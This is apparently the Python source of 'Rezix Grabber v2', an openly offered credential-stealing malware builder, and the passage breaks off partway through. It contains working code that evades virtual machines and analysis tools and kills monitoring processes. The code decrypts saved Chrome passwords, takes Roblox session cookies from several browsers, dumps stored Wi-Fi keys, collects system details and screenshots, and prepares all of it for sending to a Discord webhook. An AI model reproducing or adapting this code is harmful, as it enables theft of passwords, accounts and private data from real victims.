# Coded By DeadSkajp#5906
# TK from vesper, cuz im ass at it, but its custumized!
import os,sys,requests,re,marshal,base64,zlib,shutil,subprocess
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
import webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep

# Obsfucator
import os, base64, argparse, codecs, random, string

window = Tk()
window.title("Rezix Grabber v2")
window.geometry("782x475")
window.maxsize(782, 475)
window.minsize(782, 475)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#484848')
bg1 = PhotoImage(file='assets/background1.png')
bg = PhotoImage(file='assets/background.png')
setupbu = PhotoImage(file='assets/img0.png')
setupbu2 = PhotoImage(file='assets/img0e.png')
settingbu = PhotoImage(file='assets/img2.png')
settingbu2 = PhotoImage(file='assets/img2e.png')
aboutbu = PhotoImage(file='assets/img1.png')
aboutbu2 = PhotoImage(file='assets/img1e.png')
browsebu = PhotoImage(file='assets/img4.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
testbu = PhotoImage(file='assets/img5.png')
buildbu = PhotoImage(file='assets/buidbu.png')
checkbu = PhotoImage(file='assets/checkbu.png')
installbu = PhotoImage(file='assets/installbu.png')
bg3 = PhotoImage(file='assets/settingbg.png')
bg4 = PhotoImage(file='assets/aboutbg.png')
ytb = PhotoImage(file='assets/yt.png')
disco = PhotoImage(file='assets/dsc.png')
paypa = PhotoImage(file='assets/PayPal.png')
fc = PhotoImage(file='assets/fc.png')
Rezix_Grabber = r'''
# Grabber Coded by DeadSkajp#5906
# Discord server: https://discord.gg/gUVF7nNuQ8
# Website: https://rezix.tk/
import requests, json, os, sys, base64, shutil, sqlite3, platform, psutil, subprocess, wmi, uuid, re, ctypes, random, time, browser_cookie3, threading
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab
from datetime import datetime
from sqlite3 import connect
from collections import Counter 
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from tempfile import gettempdir, mkdtemp

# Debug is giving output to console, if you want to see it just don't click on 'no console' in builder
debug = 0

class RezixGrabber:
    def check_Blacklist():
        global VMstate
        if debug == 1:print("/!!> Checking Blacklist")
        blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000','5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',  '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",  "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        def check_vm():
            global VMstate
            VMBruh = 0
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in blacklistedProcesses):
                    try:
                        proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        VMBruh = 1
                        pass
            if VMBruh == 1:
                VMstate = "Running in VM"
            else:
                VMstate = "Running on PC"
        def check_network():
            ip = requests.get('https://api.ipify.org').text
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            if ip in blackListedIPS:
                return sys.exit()
            if mac in blackListedMacs:
                return sys.exit()
        def check_system():
                username = os.getenv("UserName")
                hostname = os.getenv("COMPUTERNAME")
                hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
                if hwid in blackListedHWIDS:
                    return sys.exit()
                if username in blackListedUsers:
                    return sys.exit()
                if hostname in blackListedPCNames:
                    return sys.exit()
        check_vm()
        check_network()
        check_system()
        if debug == 1:print("/!!> Everything OK")
    def Prepare_stage():
        global tmpPath, MessageWH, upFiles, MainMSG, NetMSG, CopyMSG
        if debug == 1:print("/1> Grabber Started")
        tmpPath = gettempdir()
        if debug == 1:print(f"/2> Temp Path Set To: {tmpPath}")
        subprocess.call(f'echo 1 >> {tmpPath}/test.txt', shell=True)
        with open(f"{tmpPath}/test.txt", "r") as f:
            cr_fl = f.read()
            if "1" in cr_fl:
                print("/!!> Test passed")
            else:
                print("/!!> Test failed")
        subprocess.call(f'del /F /S /Q {tmpPath}\^test.txt >nul', shell=True)
        MessageWH = DiscordWebhook(url=webhookw, username="Logger | Project Rezix", avatar_url="https://i.imgur.com/JTXOj5G.jpg")
        upFiles = DiscordWebhook(url=webhookw, username="Logger | Project Rezix", avatar_url="https://i.imgur.com/JTXOj5G.jpg")
        MainMSG = DiscordEmbed(title="Logged Info", description="", color='404040')
        NetMSG = DiscordEmbed(  title="Network Info", description="", color='404040')
        CopyMSG = DiscordEmbed( title="Copyright", description="", color='404040')
        MainMSG.set_footer(text="By DeadSkajp#5906")
        NetMSG.set_footer(text="By DeadSkajp#5906")
        CopyMSG.set_timestamp()
    def Del_Previous():
        subprocess.call(f'if exist {tmpPath}\ChromeData.db del /F /S /Q {tmpPath}\ChromeData.db >nul && echo. >> {tmpPath}\ChromeData.db', shell=True)
        subprocess.call(f'if exist {tmpPath}\Pass.txt del /F /S /Q {tmpPath}\Pass.txt >nul && echo. >> {tmpPath}\Pass.txt', shell=True)
        subprocess.call(f'if exist {tmpPath}\mails.txt del /F /S /Q {tmpPath}\mails.txt >nul && echo/ >> {tmpPath}\mails.txt', shell=True)
        subprocess.call(f'if exist {tmpPath}\whoami.txt del /F /S /Q {tmpPath}\whoami.txt {tmpPath}\os.txt {tmpPath}\cf1.txt {tmpPath}\8888.txt {tmpPath}\screen.jpg {tmpPath}\misc.txt {tmpPath}\osname1.txt >nul', shell=True)
        if debug == 1:print("/3> Deleted Files From Previous Grab")
    def GrabPassEmail():
        if debug == 1:print("/4> Setting Up Password & Mail Grab")
        def get_encryption_key(local_state_path):
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return CryptUnprotectData(key, None, None, None, 0)[1]
        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
            def decrypt_payload2(cipher, payload):
                return cipher.decrypt(payload)
            def generate_cipher2(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
            def decrypt_password2(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = self.generate_cipher2(master_key, iv)
                    decrypted_pass = self.decrypt_payload2(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except:pass
        if debug == 1:print("/5> Password & Mail Grab Set")
    def Grab_Mail():
        global usernames
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = f"{tmpPath}/ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = connect(filename)
        cursor = db.cursor()
        cursor.execute("select username_value from logins order by date_created")
        usernames = []
        for row in cursor.fetchall():
            dataz = "=== Rezix Grabber ==="
            username = row[0] 
            if "@" in username:
                usernames.append((username))
            else:
                continue
    def get_duplicates(values):
        return [key for key in Counter(values).keys() if Counter(values)[key]>1]
    def MailDupe(usernames):
        def get_duplicates(usernames):
            return [key for key in Counter(usernames).keys() if Counter(usernames)[key]>1]
        duplicates = get_duplicates(usernames)
        emails = []
        for name in duplicates:
            with open(f'{tmpPath}\mails.txt', 'a', encoding='utf-8') as file:
                file.write(f"Mail: {name}\n")
        subprocess.call(f'if not exist {tmpPath}\mails.txt echo No Emails Found >> {tmpPath}\mails.txt', shell=True)
        if debug == 1:print("/6> Mails Grabbed")
    def Grab_Passwords():
        def get_encryption_key(local_state_path):
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return CryptUnprotectData(key, None, None, None, 0)[1]
        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
        def decrypt_payload2(cipher, payload):
            return cipher.decrypt(payload)
        def generate_cipher2(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password2(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = self.generate_cipher2(master_key, iv)
                decrypted_pass = self.decrypt_payload2(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except:pass
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        key = get_encryption_key(local_state_path)
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = f"{tmpPath}/ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            dataz = "=== Rezix Grabber ==="
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            dcreate = row[4]
            dlu = row[5]        
            if username or password:
                dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
                dataz += "=====================\n\n"
                with open(f'{tmpPath}\Pass.txt', 'a', encoding='utf-8') as file:
                    file.write(dataz)
            else:
                continue
        subprocess.call(f'if not exist {tmpPath}\Pass.txt echo No Password Found >> {tmpPath}\Pass.txt', shell=True)
        if debug == 1:print("/7> Passwords Grabbed")
        db.close()
    def RBLXsteal():
        global RBcookie
        def edge_logger():
            global RBcookie
            try:
                global RBcookie
                cookies = browser_cookie3.edge(domain_name='roblox.com')
                cookies = str(cookies)
                RBcookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            except:
                pass
        def chrome_logger():
            global RBcookie
            try:
                global RBcookie
                cookies = browser_cookie3.chrome(domain_name='roblox.com')
                cookies = str(cookies)
                RBcookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            except:
                pass
        def firefox_logger():
            global RBcookie
            try:
                global RBcookie
                cookies = browser_cookie3.firefox(domain_name='roblox.com')
                cookies = str(cookies)
                RBcookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            except:
                pass
        def opera_logger():
            global RBcookie
            try:
                global RBcookie
                cookies = browser_cookie3.opera(domain_name='roblox.com')
                cookies = str(cookies)
                RBcookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
            except:
                pass
        browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
        for x in browsers:
            threading.Thread(target=x,).start()
        time.sleep(0.3)
        try:
            RBcookie
        except NameError:
            RBcookie = "No cookie found"
    def PC_specs():
        global cpu, gpu, hwid, mac, boot_time_timestamp, bt, net_io, User, Host, out, disk
        if debug == 1:print("/8> Setting Up PC Spec Scraper")
        def wifi_data():
            global out
            networks, out = [], ''
            try:
                wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                wifi = [i.split(":")[1][1:-1]
                        for i in wifi if "All User Profile" in i]
                for name in wifi:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                        results = [b.split(":")[1][1:-1]
                                    for b in results if "Key Content" in b]
                    except subprocess.CalledProcessError:
                        networks.append((name, ''))
                        continue
                    try:
                        networks.append((name, results[0]))
                    except IndexError:
                        networks.append((name, ''))
            except subprocess.CalledProcessError:
                pass
            out += f'{"SSID":<22}| {"PASSWORD":<}\n'
            out += f'{"-"*22}|{"-"*29}\n'
            for name, password in networks:
                out += '{:<22}| {:<}\n'.format(name, password)
            return out
        def disk_data():
            global disk
            disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Used") + "\n"
            for part in psutil.disk_partitions(all=False):
                if os.name == 'nt':
                    if 'cdrom' in part.opts or part.fstype == '':
                        continue
                usage = psutil.disk_usage(part.mountpoint)
                disk += ("{:<9} "*4).format(part.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
            return disk
        wifi_data()
        disk_data()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        User = os.getenv("UserName")
        Host = os.getenv("COMPUTERNAME")
        cpufreq = psutil.cpu_freq()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        net_io = psutil.net_io_counters()
        if debug == 1:print("/8> PC Spec Scraper Set")
    def CreateTxTs():
        if debug == 1:print("/9> Creating TxTs (will take a moment)")
        subprocess.call(f'whoami >> {tmpPath}/whoami.txt', shell=True)
        subprocess.call(f'PING -n 1 1.1.1.1 | FIND "TTL=" >> {tmpPath}/cf1.txt', shell=True)
        subprocess.call(f'PING -n 1 8.8.8.8 | FIND "TTL=" >> {tmpPath}/8888.txt', shell=True)
        subprocess.call(f'ver >> {tmpPath}/os.txt', shell=True)
        subprocess.call(f'echo IP Config:>> {tmpPath}/misc.txt && ipconfig >> {tmpPath}/misc.txt', shell=True) 
        subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo Task List:>> {tmpPath}/misc.txt && tasklist >> {tmpPath}/misc.txt', shell=True)
        subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo Active CHCP:>> {tmpPath}/misc.txt && chcp >> {tmpPath}/misc.txt', shell=True)
        subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo System info:>> {tmpPath}/misc.txt && systeminfo >> {tmpPath}/misc.txt', shell=True)
        subprocess.call(f'echo. >>{tmpPath}/osname.txt && systeminfo | findstr /B /C:"OS Name">> {tmpPath}/osname1.txt', shell=True) 
        if debug == 1:print("/10> TxTs Created")
    def TxTtoVar():
        global User, OS, Ping1111, Ping8888, osName, mails, WhoAmI
        if debug == 1:print("/11> Converting TxTs to Variables")
        with open(f'{tmpPath}/os.txt', 'r') as fr:
            lines = fr.readlines()
            ptr = 1
            with open(f'{tmpPath}/os.txt', 'w') as fw:
                for line in lines:
                    if ptr != 1:
                        fw.write(line)
                    ptr += 1
        with open(f'{tmpPath}/mails.txt', 'r') as fr: 
            lines = fr.readlines()
            if lines[0] == "No Emails Found":
                fw.write(lines[0])
            else:
                ptr = 1
                with open(f'{tmpPath}/mails.txt', 'w') as fw:
                    for line in lines:
                        if ptr != 1:
                            fw.write(line)
                        ptr += 1
        whoamiFile = f"{tmpPath}/whoami.txt"
        osFile = f"{tmpPath}/os.txt"
        osNameFile = f"{tmpPath}/osname1.txt"
        Ping1111File = f"{tmpPath}/cf1.txt"
        Ping8888File = f"{tmpPath}/8888.txt"
        MailsFile = f"{tmpPath}\mails.txt"
        with open(osFile) as file:
            OS1 = (file.read())
            OS2 = OS1.replace("Microsoft Windows", "")
            OS3 = OS2.replace("[Version", "")
            OS4 = OS3.replace("]", "")
            OS =  OS4.strip()
        with open(Ping1111File) as file:
            Ping1 = (file.read())
            Ping1I = Ping1.replace("time=", "")
            Ping1111 = Ping1I.split()[4]
        with open(Ping8888File) as file:
            Ping8 = (file.read())
            Ping88 = Ping8.replace("time=", "")
            Ping8888 = Ping88.split()[4]
        with open(whoamiFile) as file:
            WhoAmI = (file.read())
        with open(osNameFile) as file:
            osName1 = (file.read())
            osName2 = osName1.replace("OS Name:", "")
            osName = osName2.replace("Microsoft Windows", "")
        with open(MailsFile) as file:
            mails = (file.read())
            if "@" in mails:
                print("/!!> Mails Found")
            else:
                mails = "No Mails Found"
                print("/!!> No Mails Found")
        if debug == 1:print("/12> All TxTs Converted To Variables")
    def Screenshot():
        if debug == 1:print("/13> Taking Screenshot")
        screeny = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)
        screeny.save(f"{tmpPath}/screen.jpg")
    def GetIPloc():
        global ip, city, region, countrycode, postal, loc, timezone, org, googlemap
        ipv4 = "https://ipinfo.io/json"
